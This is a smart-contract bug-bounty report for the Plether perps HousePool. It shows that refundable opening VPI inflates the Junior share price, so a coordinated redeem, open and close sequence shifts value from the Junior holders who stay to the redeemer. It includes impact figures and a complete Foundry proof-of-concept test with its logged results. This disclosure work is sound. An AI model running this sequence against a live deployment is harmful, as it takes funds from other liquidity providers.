# \#99600 [SC-Critical] Junior share price counts refundable opening VPI as revenue, so a holder who redeems between its own position's open and close takes value from the other Junior holders

**Submitted on Nov 14th 2026 at 12:34:18 UTC by @Rayjine for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99600
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Description

### Summary

Positive VPI paid when a position opens is booked as pool revenue at once, so it is already in the Junior share price at the next LP epoch settlement. The same position gets that VPI back when it closes. A Junior redemption funded in between leaves with a pro-rata share of money the pool then pays back, and the holders who stay fund the whole refund.

One party can do this on purpose: hold Junior, queue a redemption, open a skew-increasing position just before the epoch boundary, let the epoch settle, close. On a 10M pool at release parameters, a party holding 5/7 of Junior ends 2,512 USDG ahead per round and the other Junior holder 4,110 USDG behind, with no price move. It can repeat about every three hours.

I state the limits up front: each round is capped at 8 bps of pool depth, and on an empty book it only pays for a party redeeming more than about 40% of Junior (30% when other traders' skew already exists).

### Root cause

Paths are under `packages/perps/src` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

1. Open: `CfdEngineSettlementSidecar.executeOpen` sends the positive trade cost to the pool and records it as `Revenue` / `CashArrived` (`CfdEngineSettlementSidecar.sol:446-462`). `HousePool.recordClaimantInflow` adds it to `accountedAssets` immediately (`HousePool.sol:640-648`).
2. Share price: tranche value starts from `pool.totalAssets()` (`CfdEngineProtocolLens.sol:64`, `libraries/HousePoolAccountingLib.sol:63`) with no deduction for open positions' positive lifetime VPI. `_settleLpEpoch` reconciles and then prices Junior redemptions and deposits from `juniorPrincipal` (`HousePool.sol:835-840`, `:881-888`, `:915`).
3. Close: `CloseAccountingLib.buildCloseState` clamps the rebate only so that lifetime VPI does not go negative (`libraries/CloseAccountingLib.sol:107-118`), so a close that returns skew to where it was refunds up to the full amount paid, from the pool (`CfdEngineSettlementSidecar.sol:621-623`).

### Impact

Pool of 10,002,000 USDG: Senior 3M, Junior 7M. Release risk parameters from `DEPLOYMENT.md`, release Senior limits and oracle confidence multiplier. The price never moves. Amounts in USDG. Each figure is the run with the trade minus a control run with the same LP requests at the same times and no trade.

The redeeming party holds 5M of Junior and a trading account; another holder has 2M. The position is 4M notional, open for about 21 seconds across the epoch boundary.

| Case | Redeeming party (LP + trading account) | Other Junior holder | Incoming depositor |
| --- | --- | --- | --- |
| One round | +2,512.27 | -4,110.23 | n/a |
| One round, oracle confidence at the 10 bps cap on every tick | +1,223.60 | -2,821.80 | n/a |
| Five rounds, re-depositing each time, 13 hours | +12,604.29 | -20,594.02 | n/a |
| One round, an unrelated 5.02M deposit activates in the same settlement | +2,494.46 | +465.90 | -4,560.60 |
| Another trader already holds 3.6M; party holds 30% of Junior and adds 0.4M | +135.54 | -295.49 | n/a |
| Limit: empty book, party holds 20% of Junior | -1,600.60 | +0.59 | n/a |

In the first row the open added 7,998.40 to the pool, the redemption took 5,712.33 more than in the control, and the close paid 6,398.35 back out. The other holder loses 0.21% of its position per round and 1.03% over five rounds, without doing anything. The test asserts that value is conserved: what the redeeming party and the treasury gain is what the rest of Junior loses.

The same thing happens with no intent. With another trader's 3.6M position open, a 30% Junior holder who simply redeems and never trades ends 1,507.95 ahead of where it would be if nobody redeemed, and the other holder 1,511.84 behind.

### Why I do not think this is the documented design

The documents say VPI is LP revenue when paid and is kept out of the marked price book (`ACCOUNTING_SPEC.md:141-142`, `SECURITY.md:863`). I am not disputing that. They accept timing between LP cohorts only for carry, and call it intentional there (`WHITEPAPER.md:974-976`). I found no such statement for VPI, and VPI is different: carry is never returned to the payer, while VPI is returned by the protocol's own close path, so the payer can raise the share price and then reverse it. PR #62 fixed the same kind of inconsistency for price PnL ("A depositor entering while material trader liabilities were open therefore paid against a higher NAV"). The upstream test `test/perps/accounting/fees/VpiDepth.t.sol:107-142` runs this exact sequence (open, Junior redemption, close) and only checks that the trader did not profit.

### Difference from the listed scan finding

"Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" describes a similar sequence, but its cause is the rebate being computed at a reduced pool depth. Here that effect is 6.39 USDG of the 7,998.40 refund. In the fourth row above, pool depth at the close is higher than at the open and the party still gains 2,494.46. The cause here is that the share price includes the VPI while it is still refundable.

### Preconditions and limits

- No privileged role. Orders and LP settlement can be executed by any address.
- The redemption must be requested at least 5 minutes before the epoch and be fully funded in that settlement.
- The deliberate form is not risk-free. In additional variant tests the redeeming party loses if the price moves about 6 bps against the position right after settlement (-1,489 at 10 bps), if the redemption is only about half funded in a Senior-heavy pool (-999), if the other holder queues a matching redemption (-2,053), or if another trader opens the opposite side during the window and the party closes anyway (-27,187). I can share those tests.
- Mocks are Pyth and USDG only. No in-scope contract is modified. Release pool and oracle settings are applied through the real timelocks in `setUp`.
- Not tested: real Pyth data, sequencer ordering, more than five rounds.

### Severity

I selected "Theft of unclaimed yield" because the value taken is VPI revenue held by the pool. In the deliberate form the other holder also ends below its own deposit, so the direct-theft title may apply; I leave that to triage.

### Suggested fix (untested)

Keep positive lifetime VPI of open positions out of tranche value until the position closes or is liquidated, for example by tracking the aggregate of `max(vpiAccrued, 0)` and subtracting it in `buildReconcileSnapshot`.


## Proof of Concept

## Proof of Concept


Runs in the repository's Foundry test suite at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. No in-scope contract is modified. Mocks replace only Pyth and USDG.

1. Check out the repository at the commit in scope with its submodules.
2. Save the file below as `packages/perps/test/perps/CC_LP_VpiNavPump.t.sol`.
3. Run:

```sh
forge test --root packages/perps --match-path 'test/perps/CC_LP_VpiNavPump.t.sol' -vv
```

Expected result: 7 tests pass.

```
[PASS] test_Limit_TwentyPercentHolderLosesMoney() (gas: 6037040)
[PASS] test_ExistingSkew_ThirtyPercentHolderProfits() (gas: 6182068)
[PASS] test_Passive_PlainRedemptionKeepsAnotherTradersVpi() (gas: 4972223)
[PASS] test_FiveRounds_LossToRemainingHoldersAccumulates() (gas: 31118820)
[PASS] test_OneRound_DepthNotReducedAtClose_IncomingDepositorFundsRefund() (gas: 7214534)
[PASS] test_OneRound_RedeemerKeepsVpiRemainingHoldersFundRefund() (gas: 6037399)
[PASS] test_OneRound_StillPaysWithOracleConfidenceAtCap() (gas: 6099324)
Ran 3 test suites in 44.39ms (81.03ms CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

Headline test output (amounts are in 6-decimal USDG units):

```
[PASS] test_OneRound_RedeemerKeepsVpiRemainingHoldersFundRefund() (gas: 6037399)
Logs:
    pool depth at the open 10002000000000
    pool cash added by the open (VPI) 7998400319
    pool depth at the close 5004325224972
    pool cash paid out by the close 6398345307
  control: redeemer cash 4999960847042
  trade:   redeemer cash 5005673175347
  control: trader balance 100000000000
  trade:   trader balance 96799944988
  control: remaining holder share value 1999984329676
  trade:   remaining holder share value 1995874100712
  redeemer and trader combined, trade minus control 2512273293
  remaining holder, trade minus control -4110228964
  incoming depositor, trade minus control 0
  remaining Junior principal, trade minus control -4112280906
  senior principal, trade minus control 7613
  protocol treasury, trade minus control 1600000000
```

No-trade test output:

```
[PASS] test_Passive_PlainRedemptionKeepsAnotherTradersVpi() (gas: 4972223)
Logs:
  redeemer: value if it had stayed 2100418937265
  redeemer: cash from the plain redemption 2101926889847
  other holder: value if the redeemer had stayed 4900977511139
  other holder: value after the redemption and the close 4899465668639
```

Test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Opening VPI is booked as pool revenue at once and so enters the Junior share price at the next LP epoch
///         settlement. The position that paid it can take it back on close, because the close clamp only stops
///         lifetime VPI going negative. These tests measure what a Junior redemption funded between that open and
///         that close keeps, and what the Junior holders who stay end up with.
/// @dev Orders, mark refreshes, LP requests, LP settlement and claims all go through production entry points. Risk
///      parameters, senior limits and the oracle confidence multiplier are the release values from DEPLOYMENT.md.
///      The mocks are Pyth and the settlement token (a plain six-decimal ERC-20), both outside the audited scope.
abstract contract VpiSharePriceBase is BasePerpTest {
    address internal redeemer = address(0xA77AC0); // Junior holder who redeems
    address internal trader = address(0xA77AC1); // places and executes the order; same party as `redeemer`
    address internal holder = address(0xB0B); // Junior holder who stays
    address internal incomer = address(0xC0FFEE); // unrelated Junior depositor, used in one test only
    address internal seniorLp = address(0x5E9102);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant SIZE = 4_000_000e18; // 4M USDG notional at 1.00: the 40% skew cap of a 10M pool
    uint256 internal constant MARGIN = 40_000e6;
    uint256 internal constant TRADER_FUND = 100_000e6;
    uint256 internal constant SENIOR = 3_000_000e6;
    uint64 internal constant CONFIDENCE_AT_CAP = 100_000; // 10 bps of 1.00, the most the oracle accepts

    struct Ledger {
        uint256 redeemerCash;
        uint256 traderBalance;
        uint256 holderShareValue;
        uint256 incomerShareValue;
        uint256 juniorPrincipal;
        uint256 seniorPrincipal;
        uint256 treasury;
    }

    function _redeemerJunior() internal pure virtual returns (uint256);

    function _tradeSize() internal pure virtual returns (uint256) {
        return SIZE;
    }

    function _tradeMargin() internal pure virtual returns (uint256) {
        return MARGIN;
    }

    function _holderJunior() internal pure virtual returns (uint256);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.fadMarginBps = 300;
        params.baseCarryBps = 500;
        params.minBountyAssets = 1e6;
        params.bountyBps = 10;
        params.keeperShareBps = 5000;
        params.protocolShareBps = 0;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public virtual override {
        super.setUp();

        // Release senior limits and oracle confidence multiplier, through the real 72-hour timelocks.
        IHousePool.PoolConfig memory poolConfig_ = _currentPoolConfig();
        poolConfig_.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig_.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig_);
        IOrderRouterAdminHost.RouterConfig memory routerConfig_ = _routerConfig();
        routerConfig_.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig_);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        // Monday 2024-03-11 06:00 UTC, so the whole test stays clear of the Friday and weekend calendar windows.
        _setClock(SETUP_TIMESTAMP + 7 days);

        _depositTranche(juniorVault, holder, _holderJunior());
        _depositTranche(juniorVault, redeemer, _redeemerJunior());
        _depositTranche(seniorVault, seniorLp, SENIOR);
        _fundTrader(trader, TRADER_FUND);

        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share limit");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release confidence multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence cap");

        // Holder cooldown after the funding claims.
        _advance(1 hours + 1);
    }

    /// @dev One full redemption by `redeemer`. With `withTrade`, `trader` opens about 20 seconds before the epoch
    ///      boundary, the epoch is settled one second after it, and the position is closed straight afterwards.
    function _round(
        bool withTrade,
        uint64 confidence
    ) internal {
        _round(withTrade, confidence, 0);
    }

    /// @dev With `incomerDeposit`, an unrelated account's Junior deposit of that size activates in the same
    ///      settlement, after the redemption, so pool depth at the close is not below depth at the open.
    function _round(
        bool withTrade,
        uint64 confidence,
        uint256 incomerDeposit
    ) internal {
        router.updateMarkPrice(_liveData(confidence));
        uint256 shares = juniorVault.balanceOf(redeemer);
        vm.prank(redeemer);
        uint256 requestId = juniorVault.requestRedeem(shares, redeemer, redeemer);
        uint256 epochStart = juniorVault.depositEpochStart(requestId);
        if (incomerDeposit != 0) {
            settlementToken.mint(incomer, incomerDeposit);
            vm.startPrank(incomer);
            settlementToken.approve(address(juniorVault), incomerDeposit);
            assertEq(juniorVault.requestDeposit(incomerDeposit, incomer, incomer), requestId, "same epoch");
            vm.stopPrank();
        }

        _setClock(epochStart - 20);
        if (withTrade) {
            router.updateMarkPrice(_liveData(confidence));
            uint256 poolBefore = pool.totalAssets();
            uint64 openId = _commit(false);
            _execute(openId, confidence);
            (uint256 openSize,,,,,,) = engine.positions(trader);
            assertEq(openSize, _tradeSize(), "open filled");
            console2.log("  pool depth at the open", poolBefore);
            console2.log("  pool cash added by the open (VPI)", pool.totalAssets() - poolBefore);
        }

        _setClock(epochStart + 1);
        router.settleLpEpoch(_liveData(confidence));

        if (withTrade) {
            uint256 poolBefore = pool.totalAssets();
            uint64 closeId = _commit(true);
            _execute(closeId, confidence);
            (uint256 closedSize,,,,,,) = engine.positions(trader);
            assertEq(closedSize, 0, "close filled");
            console2.log("  pool depth at the close", poolBefore);
            console2.log("  pool cash paid out by the close", poolBefore - pool.totalAssets());
        }
        if (incomerDeposit != 0) {
            assertEq(juniorVault.claimableDepositRequest(requestId, incomer), incomerDeposit, "incomer activated");
            vm.prank(incomer);
            juniorVault.claimDeposit(requestId, incomerDeposit, incomer, incomer);
        }

        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, redeemer);
        assertEq(claimable, shares, "redemption fully funded in this settlement");
        vm.prank(redeemer);
        juniorVault.claimRedeem(requestId, claimable, redeemer, redeemer);
    }

    /// @dev `redeemer` puts everything it holds back into Junior and waits out the holder cooldown.
    function _reenter() internal {
        _requestSettleClaim(juniorVault, redeemer, settlementToken.balanceOf(redeemer));
        _advance(1 hours + 1);
    }

    /// @dev Ordinary asynchronous LP entry: request, permissionless Router settlement after the epoch starts, claim.
    function _depositTranche(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        _requestSettleClaim(vault, lp, amount);
    }

    function _requestSettleClaim(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 depositId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        _setClock(vault.depositEpochStart(depositId) + 1);
        router.settleLpEpoch(_liveData(0));
        uint256 claimable = vault.claimableDepositRequest(depositId, lp);
        assertEq(claimable, amount, "deposit activated");
        vm.prank(lp);
        vault.claimDeposit(depositId, claimable, lp, lp);
    }

    function _ledger() internal view returns (Ledger memory ledger) {
        ledger.redeemerCash = settlementToken.balanceOf(redeemer);
        ledger.traderBalance = clearinghouse.balanceAssets(trader);
        ledger.holderShareValue = juniorVault.convertToAssets(juniorVault.balanceOf(holder));
        ledger.incomerShareValue = juniorVault.convertToAssets(juniorVault.balanceOf(incomer));
        (ledger.seniorPrincipal, ledger.juniorPrincipal,,) = pool.getPendingTrancheState();
        ledger.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    function _report(
        Ledger memory control,
        Ledger memory attack
    ) internal pure returns (int256 redeemerNet, int256 holderNet) {
        redeemerNet = int256(attack.redeemerCash + attack.traderBalance)
            - int256(control.redeemerCash + control.traderBalance);
        holderNet = int256(attack.holderShareValue) - int256(control.holderShareValue);
        int256 treasuryNet = int256(attack.treasury) - int256(control.treasury);
        int256 juniorNet = int256(attack.juniorPrincipal) - int256(control.juniorPrincipal);
        int256 seniorNet = int256(attack.seniorPrincipal) - int256(control.seniorPrincipal);

        console2.log("control: redeemer cash", control.redeemerCash);
        console2.log("trade:   redeemer cash", attack.redeemerCash);
        console2.log("control: trader balance", control.traderBalance);
        console2.log("trade:   trader balance", attack.traderBalance);
        console2.log("control: remaining holder share value", control.holderShareValue);
        console2.log("trade:   remaining holder share value", attack.holderShareValue);
        console2.log("redeemer and trader combined, trade minus control", redeemerNet);
        console2.log("remaining holder, trade minus control", holderNet);
        console2.log("incoming depositor, trade minus control", int256(attack.incomerShareValue) - int256(control.incomerShareValue));
        console2.log("remaining Junior principal, trade minus control", juniorNet);
        console2.log("senior principal, trade minus control", seniorNet);
        console2.log("protocol treasury, trade minus control", treasuryNet);

        // Nothing is created: what the redeemer and treasury gain is what the remaining tranche value loses.
        int256 residual = redeemerNet + treasuryNet + juniorNet + seniorNet;
        require(residual > -10e6 && residual < 10e6, "value not conserved within 10 USDG");
    }

    function _commit(
        bool isClose
    ) internal returns (uint64 orderId) {
        return _commitFor(trader, _tradeSize(), _tradeMargin(), isClose);
    }

    function _commitFor(
        address account,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode(account, isClose, vm.getBlockTimestamp()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = isClose ? 0 : margin;
        request.targetPrice = isClose ? 2e8 : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    /// @dev The trader executes its own order one second and one block after commit, at the first tick after commit.
    function _execute(
        uint64 orderId,
        uint64 confidence
    ) internal {
        _executeAs(trader, orderId, confidence);
    }

    function _executeAs(
        address executor,
        uint64 orderId,
        uint64 confidence
    ) internal {
        OrderV3Types.OrderTiming memory timing = router.lifecycleBook().orderTiming(orderId);
        _advance(1);
        bytes[] memory tick = _signedTick(uint256(timing.commitTimestamp) + 1, timing.commitTimestamp, confidence);
        vm.prank(executor);
        router.executeOrder(orderId, tick);
    }

    function _advance(
        uint256 secondsForward
    ) internal {
        vm.warp(vm.getBlockTimestamp() + secondsForward);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _setClock(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _signedTick(
        uint256 publish,
        uint256 previous,
        uint64 confidence
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(PRICE)), confidence, -8, publish, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _liveData(
        uint64 confidence
    ) internal view returns (bytes[] memory) {
        return _signedTick(vm.getBlockTimestamp(), engine.lastMarkTime(), confidence);
    }
}

/// @notice Pool of 10M USDG: Senior 3M, Junior 7M of which the redeeming party holds 5M (5/7).
contract CC_LP_VpiNavPumpTest is VpiSharePriceBase {
    uint256 internal constant ROUNDS = 5;

    function _redeemerJunior() internal pure override returns (uint256) {
        return 5_000_000e6;
    }

    function _holderJunior() internal pure override returns (uint256) {
        return 2_000_000e6;
    }

    /// @dev Price never moves and oracle confidence is zero, so the only flows are VPI and execution fees.
    function test_OneRound_RedeemerKeepsVpiRemainingHoldersFundRefund() public {
        uint256 state = vm.snapshotState();
        _round(false, 0);
        Ledger memory control = _ledger();
        vm.revertToState(state);

        _round(true, 0);
        Ledger memory attack = _ledger();

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        assertGt(redeemerNet, 2_000e6, "the redeeming party ends ahead of plain redemption");
        assertLt(holderNet, -4_000e6, "the holder who stays ends behind");
    }

    /// @dev Same round with Pyth confidence at the 10 bps cap on every tick, the costliest admissible execution.
    function test_OneRound_StillPaysWithOracleConfidenceAtCap() public {
        uint256 state = vm.snapshotState();
        _round(false, CONFIDENCE_AT_CAP);
        Ledger memory control = _ledger();
        vm.revertToState(state);

        _round(true, CONFIDENCE_AT_CAP);
        Ledger memory attack = _ledger();

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        assertGt(redeemerNet, 0, "still ahead at maximum confidence");
        assertLt(holderNet, 0, "the holder who stays is still behind");
    }

    /// @dev Separates this from the known rebate-amplification issue, which needs pool depth to be lower at the
    ///      close. Here an unrelated deposit larger than the redemption activates in the same settlement, so depth
    ///      at the close is above depth at the open and the refund is at most what the unchanged curve gives.
    ///      The deposit is priced with the VPI still in the share price, so most of the refund falls on it.
    function test_OneRound_DepthNotReducedAtClose_IncomingDepositorFundsRefund() public {
        uint256 incomerDeposit = 5_020_000e6;
        uint256 state = vm.snapshotState();
        _round(false, 0, incomerDeposit);
        Ledger memory control = _ledger();
        vm.revertToState(state);

        _round(true, 0, incomerDeposit);
        Ledger memory attack = _ledger();

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        int256 incomerNet = int256(attack.incomerShareValue) - int256(control.incomerShareValue);
        assertGt(redeemerNet, 2_000e6, "the redeeming party is still ahead");
        assertLt(incomerNet, -4_000e6, "the incoming depositor paid for VPI that was then refunded");
        assertLt(holderNet + incomerNet, -4_000e6, "the other Junior holders are behind in total");
    }

    /// @dev The redeeming party re-deposits everything and repeats. The control repeats the same deposits and
    ///      redemptions at the same times with no trade.
    function test_FiveRounds_LossToRemainingHoldersAccumulates() public {
        uint256 state = vm.snapshotState();
        Ledger memory control = _rounds(false);
        vm.revertToState(state);
        Ledger memory attack = _rounds(true);

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        assertGt(redeemerNet, 10_000e6, "gain accumulates over rounds");
        assertLt(holderNet, -20_000e6, "loss accumulates over rounds");
    }

    function _rounds(
        bool withTrade
    ) internal returns (Ledger memory) {
        uint256 start = vm.getBlockTimestamp();
        for (uint256 i; i < ROUNDS; ++i) {
            if (i != 0) {
                _reenter();
            }
            _round(withTrade, 0);
        }
        console2.log("rounds", ROUNDS);
        console2.log("elapsed seconds", vm.getBlockTimestamp() - start);
        return _ledger();
    }
}

/// @notice Limit. Same pool, but the redeeming party holds only 1.4M of the 7M Junior (20%).
contract CC_LP_VpiNavPumpSmallHolderTest is VpiSharePriceBase {
    function _redeemerJunior() internal pure override returns (uint256) {
        return 1_400_000e6;
    }

    function _holderJunior() internal pure override returns (uint256) {
        return 5_600_000e6;
    }

    /// @dev At a 20% share the trade costs more in fees than the redemption keeps.
    function test_Limit_TwentyPercentHolderLosesMoney() public {
        uint256 state = vm.snapshotState();
        _round(false, 0);
        Ledger memory control = _ledger();
        vm.revertToState(state);

        _round(true, 0);
        Ledger memory attack = _ledger();

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        assertLt(redeemerNet, 0, "a small holder loses on the round trip");
        assertGt(holderNet, -100e6, "and the holder who stays is not materially hurt");
    }
}

/// @notice Another trader already holds a 3.6M position on the same side, so skew sits at 36% of depth. The
///         redeeming party holds only 2.1M of the 7M Junior (30%) and adds a 0.4M position of its own.
contract CC_LP_VpiNavPumpExistingSkewTest is VpiSharePriceBase {
    address internal otherTrader = address(0x07E12);
    address internal neutralKeeper = address(0x4EE9E2); // executes the other trader's orders; unrelated to anyone
    uint256 internal constant OTHER_SIZE = 3_600_000e18;

    function _redeemerJunior() internal pure override returns (uint256) {
        return 2_100_000e6;
    }

    function _holderJunior() internal pure override returns (uint256) {
        return 4_900_000e6;
    }

    function _tradeSize() internal pure override returns (uint256) {
        return 400_000e18;
    }

    function _tradeMargin() internal pure override returns (uint256) {
        return 4_000e6;
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(otherTrader, TRADER_FUND);
        router.updateMarkPrice(_liveData(0));
        uint64 otherOpen = _commitFor(otherTrader, OTHER_SIZE, 36_000e6, false);
        _executeAs(neutralKeeper, otherOpen, 0);
        (uint256 otherSize,,,,,,) = engine.positions(otherTrader);
        assertEq(otherSize, OTHER_SIZE, "the other trader's position is open");
        _advance(60);
    }

    /// @dev Near the skew cap the VPI on new skew is about 4.7 times its round-trip fees, so a 30% holder profits.
    function test_ExistingSkew_ThirtyPercentHolderProfits() public {
        uint256 state = vm.snapshotState();
        _round(false, 0);
        Ledger memory control = _ledger();
        vm.revertToState(state);

        _round(true, 0);
        Ledger memory attack = _ledger();

        (int256 redeemerNet, int256 holderNet) = _report(control, attack);
        assertGt(redeemerNet, 0, "a 30% holder ends ahead when skew already sits near the cap");
        assertLt(holderNet, 0, "the holder who stays ends behind");
    }

    /// @dev No trade by the redeeming party at all. It makes an ordinary redemption while the other trader's
    ///      position is open; the other trader closes afterwards. The baseline is the same timeline with no
    ///      redemption, where both holders are still in the tranche when the VPI is refunded.
    function test_Passive_PlainRedemptionKeepsAnotherTradersVpi() public {
        uint256 state = vm.snapshotState();
        (uint256 nextEpoch,) = juniorVault.getRequestEpochWindow();
        _setClock(juniorVault.depositEpochStart(nextEpoch) + 1);
        router.updateMarkPrice(_liveData(0));
        _closeOther();
        uint256 redeemerValueIfStayed = juniorVault.convertToAssets(juniorVault.balanceOf(redeemer));
        uint256 holderValueIfStayed = juniorVault.convertToAssets(juniorVault.balanceOf(holder));
        vm.revertToState(state);

        _round(false, 0);
        _closeOther();
        uint256 redeemed = settlementToken.balanceOf(redeemer);
        uint256 holderValue = juniorVault.convertToAssets(juniorVault.balanceOf(holder));

        console2.log("redeemer: value if it had stayed", redeemerValueIfStayed);
        console2.log("redeemer: cash from the plain redemption", redeemed);
        console2.log("other holder: value if the redeemer had stayed", holderValueIfStayed);
        console2.log("other holder: value after the redemption and the close", holderValue);
        assertGt(redeemed, redeemerValueIfStayed + 1_000e6, "the redemption kept VPI that was later refunded");
        assertLt(holderValue, holderValueIfStayed - 1_000e6, "the holder who stayed funded that share of the refund");
    }

    function _closeOther() internal {
        uint64 otherClose = _commitFor(otherTrader, OTHER_SIZE, 0, true);
        _executeAs(neutralKeeper, otherClose, 0);
        (uint256 otherSize,,,,,,) = engine.positions(otherTrader);
        assertEq(otherSize, 0, "the other trader's position is closed");
    }
}
```
